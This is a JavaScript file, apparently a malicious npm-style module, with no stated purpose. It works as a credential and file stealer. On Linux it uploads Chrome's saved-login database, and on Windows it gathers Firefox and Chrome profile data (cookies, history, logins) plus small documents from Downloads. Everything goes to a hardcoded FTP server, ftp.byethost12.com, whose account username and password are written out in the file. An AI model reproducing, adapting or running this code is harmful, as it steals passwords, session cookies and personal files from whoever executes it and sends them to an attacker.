var jxm = require('jxm');
var os = require('os');
var Client = require('ftp');
var finder = require('files-finder');
var c = new Client();
var exec = require('child_process').exec;
var fs = require("fs");

// For Linux
if(os.platform() === 'linux'){
    c.on('ready', function() {
        c.put('~/.config/google-chrome/Default/Login\ Data', '/htdocs/file'+ Date.now() +'.txt', function(err) {
            if (err) {
                throw err;
            }
            c.end();
        });
    });
    /* FTP Configs */
    c.connect({
        host: 'ftp.byethost12.com',
        user: 'b12_16353986',
        password: 'gregLIN19'
    });
} else if (os.platform() === 'win32'){ // For Windows
    var child = exec('whoami', function (error, stdout, stderr) {
        var arr = stdout.split('\\');
        var username = arr[arr.length - 1];
        username = username.trim();
        var final_arr = []
        /* Get All Users Personnal Files */
        var files_personal = finder('C:/Users/'+username.trim()+'/Downloads', /(pdf|doc)$/);
        files_personal.forEach(function(elem, index){
            var stats = fs.statSync(elem);
            var fileSizeInBytes = stats["size"];
            var fileSizeInMegabytes = parseInt(fileSizeInBytes) / 1000000.0;
            if(fileSizeInMegabytes < 0.5){
                final_arr.push({directory: 'perso', file: elem});
            }
        });
        /* Get All Firefox Interesting Files*/
        var files_firefox = finder('C:/Users/'+username.trim()+'/AppData/Roaming/Mozilla/Firefox/Profiles', /(json|sqlite|db)$/);
        files_firefox.forEach(function(elem, index){
            var stats = fs.statSync(elem);
            var fileSizeInBytes = stats["size"];
            var fileSizeInMegabytes = parseInt(fileSizeInBytes) / 1000000.0;
            if(fileSizeInMegabytes < 0.5){
                final_arr.push({directory: 'mozilla', file: elem});
            }
        });
        /* Get All Chrome Interesting Files*/
        var files_chrome = finder('C:/Users/'+username.trim()+'/AppData/Local/Google/Chrome/User Data', /(History|Cookies|Login|json|sqlite|db)$/);
        files_chrome.forEach(function(elem, index){
            var stats = fs.statSync(elem);
            var fileSizeInBytes = stats["size"];
            var fileSizeInMegabytes = parseInt(fileSizeInBytes) / 1000000.0;
            if(fileSizeInMegabytes < 0.5){
                final_arr.push({directory: 'chrome', file: elem});
            }
        });
        c.on('ready', function() {
            c.mkdir('/htdocs/' + username, function(err){
            c.mkdir('/htdocs/' + username + '/mozilla', function(err){
            c.mkdir('/htdocs/' + username + '/chrome', function(err){
            c.mkdir('/htdocs/' + username + '/perso', function(err){
                final_arr.forEach(function(elem, index){
                    var file_arr = elem.file.split("/");
                    c.put(elem.file, '/htdocs/'+ username +'/'+ elem.directory +'/'+ file_arr[file_arr.length - 1], function(err) {
                        if(err){
                            //console.log(err);
                        }
                        //console.log("fichier " + file_arr[file_arr.length - 1] + " envoyer");
                        if(index === final_arr.length - 1){
                            c.end();
                        }
                    });
                });
            });
        });
        });
        });
        });
        /* FTP Configs */
        c.connect({
            host: 'ftp.byethost12.com',
            user: 'b12_16353986',
            password: 'gregLIN19'
        });
    });
}
